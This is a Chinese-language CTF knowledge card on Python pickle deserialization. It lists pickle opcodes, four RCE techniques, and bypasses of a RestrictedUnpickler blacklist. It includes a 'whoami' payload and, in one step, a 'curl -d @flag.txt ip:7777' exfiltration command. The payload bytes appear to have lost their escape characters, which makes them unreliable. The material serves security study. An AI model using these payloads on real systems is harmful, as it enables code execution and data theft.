---
title: "Python pickle 反序列化浅析"
category: web
tags: ["跳跳糖安全社区", "web", "python", "pickle", "反序列化", "opcode"]
signals: ["跳跳糖安全社区 2022", "python", "pickle", "反序列化", "opcode", "reduce", "setstate", "getstate", "restricted-unpickler", "deserialize", "Python", "RCE", "setstate__", "RestrictedUnpickler"]
difficulty: medium
source: "https://www.ctfiot.com/64787.html"
tools: ["Python", "curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Python pickle 反序列化浅析

> 赛事：跳跳糖安全社区 2022 | 方向：web | 难度：medium | 工具：Python、curl

## 一句话总结

Python pickle 全部 opcode 详解 + 4 种反序列化 RCE 攻击 (reduce/R/b/__setstate__) + RestrictedUnpickler 黑名单 3 种 bypass (getattr 链/反射/sys.modules 遍历)。

## 攻击链

1. pickle 4 个核心 API: dump/dumps/load/loads
2. opcode 详解: c (import 模块类) / o (实例化) / i (import+call) / N (None) / S (str) / V (unicode) / I (int) / F (float)
3. R (call) / . (结束) / ( (MARK) / t (tuple) / ) (空 tuple) / l (list) / ] / d / }
4. p/g (memo 存/取) / 0 (pop) / b (setattr) / s (dict set) / u (update) / a (append) / e (extend)
5. 协议头 x80+proto: x80x04 = protocol 4 + FRAME x95
6. 漏洞 1: __reduce__ 返回 (os.system, (''whoami'',)) 触发命令执行
7. 漏洞 2: R opcode 直接 call 栈顶函数 (cos + ns + system + X + ...whoami + R.)
8. 漏洞 3: c+i (实例化) (cos + ns + system + X + ...whoami + o.)
9. 漏洞 4: b (setattr) c__main__\ntttang\n + t + b''X__setstate__'' + c os + ns + system + b + X ''whoami
10. RestrictedUnpickler 黑名单 eval/exec/open/__import__/exit/input
11. bypass: getattr 链 cbuiltins\ngetattr\n(cbuiltins\ndict\nS''get''\ntR → 找 globals 找 builtins 找 eval
12. bypass: 全 __builtin__ 链 (c__main__\nsecret\n + i__builtin__\ndir\n + i__builtin__\nreversed\n + i__builtin__\nnext\n → 拿到模块属性名
13. 实战: shop?page=1-300 找 lv6.png
14. 实战: commands.getoutput(''ls /'') urllib.quote + base64 + pickle
15. 实战: 反弹 shell __import__(''os'').system(''curl -d @flag.txt ip:7777'')

## 关键 payload

```
b'c__main__\ntttang\n)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.
```

## 经验教训

pickle 反序列化本质是栈机执行 opcode；__reduce__ 返回 callable+args 是最经典 RCE；RestrictedUnpickler 黑名单可用 getattr+globals+builtins 链完全绕过；load 时栈机 model 务必理解。

## 标签

python、pickle、反序列化、opcode、reduce、setstate、getstate、restricted-unpickler、bypass

## 参考来源

- https://www.ctfiot.com/64787.html
- 原文件：Python_pickle反序列化浅析.full.md
